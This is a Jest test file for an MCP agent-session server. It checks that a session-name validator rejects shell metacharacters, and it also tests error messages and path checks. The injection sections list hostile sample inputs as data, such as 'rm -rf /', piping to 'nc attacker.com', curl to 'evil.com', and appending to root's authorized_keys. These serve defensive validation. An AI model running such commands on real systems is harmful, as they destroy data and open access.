/**
 * MCP Server Validation Tests
 * Tests for session name validation and input sanitization
 */

import { describe, it, expect } from '@jest/globals';

// We need to import the validation function
// Since it's not exported, we'll test it via the server interface
// For now, create standalone tests

describe('Session Name Validation', () => {
  // Regex from index.js:55
  const validateSessionName = (name) => {
    if (!name || typeof name !== 'string') {
      throw new Error('Session name is required and must be a string');
    }

    if (!/^[a-zA-Z0-9_-]+$/.test(name)) {
      throw new Error(
        `Invalid session name '${name}'. ` +
        'Only alphanumeric characters, dashes, and underscores are allowed.'
      );
    }

    if (name.length > 100) {
      throw new Error('Session name too long (max 100 characters)');
    }

    return name;
  };

  describe('Valid session names', () => {
    it('should accept alphanumeric names', () => {
      expect(() => validateSessionName('agent-myapp-123')).not.toThrow();
      expect(() => validateSessionName('test_session_456')).not.toThrow();
      expect(() => validateSessionName('ValidName789')).not.toThrow();
    });

    it('should accept names with dashes', () => {
      expect(() => validateSessionName('my-agent-session')).not.toThrow();
    });

    it('should accept names with underscores', () => {
      expect(() => validateSessionName('my_agent_session')).not.toThrow();
    });

    it('should accept mixed case', () => {
      expect(() => validateSessionName('MyAgentSession')).not.toThrow();
    });

    it('should accept names at max length (100 chars)', () => {
      const maxName = 'a'.repeat(100);
      expect(() => validateSessionName(maxName)).not.toThrow();
    });
  });

  describe('Invalid session names - shell injection', () => {
    it('should reject semicolon (command chaining)', () => {
      expect(() => validateSessionName('test; rm -rf /')).toThrow(/Invalid session name/);
    });

    it('should reject pipe (command piping)', () => {
      expect(() => validateSessionName('test | cat /etc/passwd')).toThrow(/Invalid session name/);
    });

    it('should reject ampersand (background execution)', () => {
      expect(() => validateSessionName('test & sleep 1000')).toThrow(/Invalid session name/);
    });

    it('should reject backticks (command substitution)', () => {
      expect(() => validateSessionName('test`whoami`')).toThrow(/Invalid session name/);
    });

    it('should reject dollar sign (variable expansion)', () => {
      expect(() => validateSessionName('test$var')).toThrow(/Invalid session name/);
    });

    it('should reject dollar paren (command substitution)', () => {
      expect(() => validateSessionName('test$(whoami)')).toThrow(/Invalid session name/);
    });

    it('should reject redirect operators', () => {
      expect(() => validateSessionName('test > /tmp/file')).toThrow(/Invalid session name/);
      expect(() => validateSessionName('test < /etc/passwd')).toThrow(/Invalid session name/);
    });
  });

  describe('Invalid session names - special characters', () => {
    it('should reject spaces', () => {
      expect(() => validateSessionName('test session')).toThrow(/Invalid session name/);
    });

    it('should reject quotes', () => {
      expect(() => validateSessionName("test'quote")).toThrow(/Invalid session name/);
      expect(() => validateSessionName('test"quote')).toThrow(/Invalid session name/);
    });

    it('should reject parentheses', () => {
      expect(() => validateSessionName('test(paren)')).toThrow(/Invalid session name/);
    });

    it('should reject brackets', () => {
      expect(() => validateSessionName('test[bracket]')).toThrow(/Invalid session name/);
    });

    it('should reject braces', () => {
      expect(() => validateSessionName('test{brace}')).toThrow(/Invalid session name/);
    });

    it('should reject backslash', () => {
      expect(() => validateSessionName('test\\escape')).toThrow(/Invalid session name/);
    });

    it('should reject wildcards', () => {
      expect(() => validateSessionName('test*wildcard')).toThrow(/Invalid session name/);
      expect(() => validateSessionName('test?wildcard')).toThrow(/Invalid session name/);
    });
  });

  describe('Edge cases', () => {
    it('should reject empty string', () => {
      expect(() => validateSessionName('')).toThrow(/required/);
    });

    it('should reject null', () => {
      expect(() => validateSessionName(null)).toThrow(/required/);
    });

    it('should reject undefined', () => {
      expect(() => validateSessionName(undefined)).toThrow(/required/);
    });

    it('should reject non-string types', () => {
      expect(() => validateSessionName(123)).toThrow(/must be a string/);
      expect(() => validateSessionName({})).toThrow(/must be a string/);
      expect(() => validateSessionName([])).toThrow(/must be a string/);
    });

    it('should reject names over 100 characters', () => {
      const longName = 'a'.repeat(101);
      expect(() => validateSessionName(longName)).toThrow(/too long/);
    });
  });

  describe('Security - injection vectors', () => {
    const injectionVectors = [
      ['Command injection', 'test; rm -rf /'],
      ['Pipe injection', 'test | nc attacker.com 1234'],
      ['Background process', 'test & malicious_script'],
      ['Backtick substitution', 'test`curl http://evil.com`'],
      ['Dollar substitution', 'test$(curl http://evil.com)'],
      ['Redirect to file', 'test > /etc/passwd'],
      ['Append to file', 'test >> /root/.ssh/authorized_keys'],
      ['Null byte injection', 'test\x00malicious'],
      ['Newline injection', 'test\nrm -rf /'],
      ['Tab injection', 'test\trm -rf /'],
    ];

    injectionVectors.forEach(([description, payload]) => {
      it(`should block: ${description}`, () => {
        expect(() => validateSessionName(payload)).toThrow();
      });
    });
  });

  describe('Return value', () => {
    it('should return the validated name', () => {
      const name = 'valid-session-123';
      expect(validateSessionName(name)).toBe(name);
    });
  });
});

describe('Error Enhancement', () => {
  // Test error message enhancement logic
  const enhanceError = (error, operation) => {
    let helpText = '';

    if (error.message.includes('not found') && error.message.includes('Session')) {
      helpText = '\n\nTip: Use list_agents() to see active sessions or launch_agent() to create a new one.';
    } else if (error.message.includes('timeout')) {
      helpText = '\n\nTip: The agent may still be working. Use read_agent_output() to check progress.';
    } else if (error.code === 2 && operation === 'await_agents') {
      return {
        isTimeout: true,
        message: 'Await timeout reached. All monitored agents are still active.\n' + (error.stdout || ''),
      };
    } else if (error.message.includes('Invalid session name')) {
      helpText = '\n\nSession names must contain only letters, numbers, dashes, and underscores.';
    }

    return {
      isTimeout: false,
      message: error.message + helpText,
    };
  };

  it('should add helpful context for session not found errors', () => {
    const error = new Error('Session not found');
    const enhanced = enhanceError(error, 'kill_agent');

    expect(enhanced.message).toContain('Tip: Use list_agents()');
  });

  it('should add helpful context for timeout errors', () => {
    const error = new Error('Command timeout');
    const enhanced = enhanceError(error, 'read_agent_output');

    expect(enhanced.message).toContain('Tip: The agent may still be working');
  });

  it('should detect await timeout (exit code 2)', () => {
    const error = new Error('Command failed');
    error.code = 2;
    error.stdout = 'Timeout reached';

    const enhanced = enhanceError(error, 'await_agents');

    expect(enhanced.isTimeout).toBe(true);
    expect(enhanced.message).toContain('Await timeout reached');
  });

  it('should add context for invalid session name errors', () => {
    const error = new Error('Invalid session name');
    const enhanced = enhanceError(error, 'launch_agent');

    expect(enhanced.message).toContain('only letters, numbers, dashes, and underscores');
  });

  it('should not add context for unknown errors', () => {
    const error = new Error('Unknown error');
    const enhanced = enhanceError(error, 'some_operation');

    expect(enhanced.message).toBe('Unknown error');
    expect(enhanced.isTimeout).toBe(false);
  });
});

describe('Path Validation', () => {
  // Test path validation logic
  const isAbsolutePath = (path) => {
    return path.startsWith('/');
  };

  it('should identify absolute paths', () => {
    expect(isAbsolutePath('/tmp/task.md')).toBe(true);
    expect(isAbsolutePath('/home/user/project')).toBe(true);
  });

  it('should identify relative paths', () => {
    expect(isAbsolutePath('relative/path')).toBe(false);
    expect(isAbsolutePath('./current/dir')).toBe(false);
    expect(isAbsolutePath('../parent/dir')).toBe(false);
  });
});
